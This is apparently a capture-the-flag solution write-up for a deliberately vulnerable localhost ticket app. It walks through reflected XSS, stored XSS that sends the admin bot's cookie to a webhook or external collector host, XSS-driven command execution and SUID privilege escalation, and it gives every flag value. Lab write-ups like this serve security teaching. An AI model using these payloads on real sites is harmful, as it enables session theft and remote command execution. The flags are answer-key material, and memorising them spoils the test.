## Solution

### Part 1: Basic Reflected XSS (FLAG 1)

**Step 1: Test for XSS**

Navigate to the search page and try a basic XSS payload:

```
http://localhost:4002/search?q=<script>alert(document.domain)</script>
```

Or search for: `<script>alert(document.domain)</script>`

**Result**: You should see a JavaScript alert! This confirms the XSS vulnerability.

**Step 2: Get FLAG 1**

The search page has a `showFlag()` JavaScript function that reveals FLAG1 when XSS is successfully executed:

```javascript
function showFlag() {
    // This function displays the flag when called
    // It requires actual JavaScript execution, not just keyword matching
}
```

To get the flag, you need to execute JavaScript that calls `showFlag()`:

**Payload Options**:

```
http://localhost:4002/search?q=<script>showFlag()</script>
```

Or using an image tag:
```
http://localhost:4002/search?q=<img src=x onerror="showFlag()">
```

The flag will be displayed in a success box on the page after the XSS payload executes.

**FLAG 1**: `DUNO{b8020ed30dd2a6b8295e87f2dacf57b3}`

### Part 2: Cookie Theft via Admin Bot (FLAG 2)

Now we need to steal the admin's cookie. The admin bot visits reported tickets, so we'll use stored XSS in a ticket.

**Step 1: Create a Malicious Ticket**

The ticket title and description fields are vulnerable to stored XSS. Create a ticket with an XSS payload:

1. Go to "Submit Ticket"
2. **Title**: `Urgent: Server Down`
3. **Description**: Insert XSS payload (see options below)
4. **Reporter**: `attacker`
5. Submit the ticket

**XSS Payload Options**:

**Option A: Using the built-in webhook**

The webhook endpoint logs the **entire JSON body** as received — any JSON key works. Use whichever key name makes sense to you:

```html
<!-- Using "cookie" key -->
<script>
fetch('http://localhost:4002/webhook', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cookie: document.cookie})
});
</script>
```

```html
<!-- Using "data" or "token" key — both work equally well -->
<script>
fetch('http://localhost:4002/webhook', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({data: document.cookie})
});
</script>
```

**Option B: Using an external service (Beeceptor, RequestBin, etc.)**

```html
<script>
fetch('https://your-unique-id.beeceptor.com', {
    method: 'POST',
    body: document.cookie
});
</script>
```

**Option C: Simple image tag (if external access available)**

```html
<img src="x" onerror="fetch('https://your-webhook.com/?c='+document.cookie)">
```

**Step 2: Report the Ticket to Admin**

1. View your newly created ticket
2. Click "Report to Admin"
3. Wait 5-7 seconds for the real Selenium admin bot to visit

**Step 3: Capture the Stolen Cookie**

If using the built-in webhook, check the logs:

```bash
# Using Docker
docker exec ctf-xss-support-tickets cat /tmp/webhook_log.txt

# Or visit the webhook log endpoint
curl http://localhost:4002/webhook/log
```

You should see the admin's cookie (along with the auto-clear header):
```
╔══════════════════════════════════════════════════════════════════════╗
║  EverSec Webhook Log Viewer                                          ║
║  🕐 Auto-clear: Every 3 minutes                                      ║
║  📅 Last cleared: 2026-01-31 15:20:45                                 ║
║  ⏱️  Next clear: in 2m 30s                                             ║
╚══════════════════════════════════════════════════════════════════════╝

[2026-01-31 15:18:32] admin_session=DUNO{48cb5c91efbf1b3ef6270caf56e76a14}
```

**FLAG 2**: `DUNO{48cb5c91efbf1b3ef6270caf56e76a14}`

**⚠️ Important**: Webhook logs auto-clear every 3 minutes. Check them promptly after the admin bot visits!

### Part 3: XSS to RCE via Internal Admin Endpoint (FLAG 3)

The admin bot runs on localhost and has access to an internal command execution endpoint at `/admin/cmd`. We can use XSS to make the admin bot access this endpoint.

**Step 1: Craft XSS Payload for SSRF to RCE**

Create a ticket with this XSS payload:

```html
<script>
fetch('/admin/cmd?cmd=cat /home/ctfuser/flag3.txt')
    .then(r => r.json())
    .then(data => {
        // Send the output to your webhook
        fetch('/webhook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({output: data.output})
        });
    });
</script>
```

**Alternative - Display in alert**:
```html
<script>
fetch('/admin/cmd?cmd=cat /home/ctfuser/flag3.txt')
    .then(r => r.json())
    .then(data => alert(data.output));
</script>
```

**Step 2: Report Ticket to Admin**

1. Submit the malicious ticket
2. Click "Report to Admin"
3. Wait 5-7 seconds for admin bot to visit and execute the payload

**Step 3: Check Webhook Logs Promptly**

```bash
curl http://localhost:4002/webhook/log
```

You should see the output of the command containing FLAG 3:
```
[2026-01-31 15:25:12] {"flag3":"DUNO{a7ab83a097b666b412340d03edbbdbfd}\n"}
```

**FLAG 3**: `DUNO{a7ab83a097b666b412340d03edbbdbfd}`

**⚠️ Important**: Logs clear every 3 minutes! Check immediately after exploitation.

### Part 4: Privilege Escalation via SUID Binary (FLAG 4)

Now that we can execute commands via the admin endpoint, let's escalate to root.

**Step 1: Discover SUID Binary**

First, we need shell access. You can either:

**Option A**: Use `docker exec` to get a shell:
```bash
docker exec -it foxtrot-xss-support-tickets /bin/sh
```

**Option B**: Use XSS to trigger reverse shell (advanced)

**Step 2: Find SUID Binaries**

```bash
find / -perm -4000 -type f 2>/dev/null
```

You'll find `/usr/local/bin/backup_tool` with SUID bit set.

**Step 3: Test the Binary**

```bash
ls -la /usr/local/bin/backup_tool
# Output: -rwsr-xr-x  (notice the 's' - SUID bit)

/usr/local/bin/backup_tool /etc/passwd
# It reads and displays the file!
```

**Step 4: Exploit Path Traversal**

The binary doesn't validate paths, so we can read ANY file:

```bash
/usr/local/bin/backup_tool /root/flag4.txt
```

**FLAG 4**: `DUNO{980be85a17a8c38602ae88d37edc4b11}`

### Alternative: Chain Everything via XSS

You can get FLAG 4 entirely through XSS by making the admin bot execute the SUID binary:

```html
<script>
fetch('/admin/cmd?cmd=/usr/local/bin/backup_tool /root/flag4.txt')
    .then(r => r.json())
    .then(data => {
        fetch('/webhook', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({flag4: data.output})
        });
    });
</script>
```